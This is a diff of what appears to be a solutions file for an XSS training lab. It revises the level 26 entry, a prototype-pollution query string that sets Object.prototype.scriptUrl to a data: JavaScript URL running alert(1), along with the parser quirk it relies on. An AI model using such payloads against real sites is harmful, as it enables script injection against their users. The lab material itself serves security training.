@@ -179,8 +179,8 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 
 ### modern-bypass-level26
 
-`/modern-bypass/level26/?config%5B__proto__%5D%5BscriptUrl%5D=data%3Atext%2Fjavascript%2Calert%281%29`
-- payload: `?config[__proto__][scriptUrl]=data:text/javascript,alert(1)`
-- context: Client-side recursive query parsing allows parameters to pollute `Object.prototype.scriptUrl`, triggering dynamic XSS when config loads.
+`/modern-bypass/level26/?__proto__|scriptUrl=data:text/javascript,alert(1)`
+- payload: `__proto__|scriptUrl=data:text/javascript,alert(1)`
+- context: the query parser splits keys on `|`, so `__proto__|scriptUrl` pollutes Object.prototype
 
 
